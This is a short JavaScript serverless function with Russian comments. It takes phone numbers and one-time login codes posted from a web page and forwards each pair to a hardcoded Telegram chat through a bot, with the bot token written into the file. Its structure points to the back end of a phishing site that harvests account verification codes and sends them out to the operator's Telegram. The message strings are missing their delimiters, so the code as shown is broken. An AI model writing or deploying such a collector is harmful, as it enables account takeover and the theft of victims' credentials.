const TelegramBot = require('node-telegram-bot-api');

// Замените на ваши данные
const TELEGRAM_BOT_TOKEN = '7644523613:AAFK-3sc0EaMYb9XirbmiCJt4joBkD3sl0w';
const CHAT_ID = '-4854718691';

const bot = new TelegramBot(TELEGRAM_BOT_TOKEN);

exports.handler = async (event, context) => {
    if (event.httpMethod !== 'POST') {
        return {
            statusCode: 405,
            body: JSON.stringify({ error: 'Метод не разрешен' }),
        };
    }

    try {
        const { type, data } = JSON.parse(event.body);
        let message = '';

        if (type === 'phone') {
            message = <b>🔔 Новый номер телефона!</b>\n\n<b>📱 Телефон:</b> <code>${data}</code>;
        } else if (type === 'code') {
            message = <b>🔑 Получен код!</b>\n\n<b>📱 Телефон:</b> <code>${data.phone}</code>\n<b>🔒 Код:</b> <code>${data.code}</code>;
        } else {
            return {
                statusCode: 400,
                body: JSON.stringify({ error: 'Неверный тип запроса' }),
            };
        }

        await bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
        return {
            statusCode: 200,
            body: JSON.stringify({ success: true }),
        };
    } catch (error) {
        console.error('Ошибка:', error);
        return {
            statusCode: 500,
            body: JSON.stringify({ error: 'Ошибка отправки сообщения в Telegram' }),
        };
    }
};
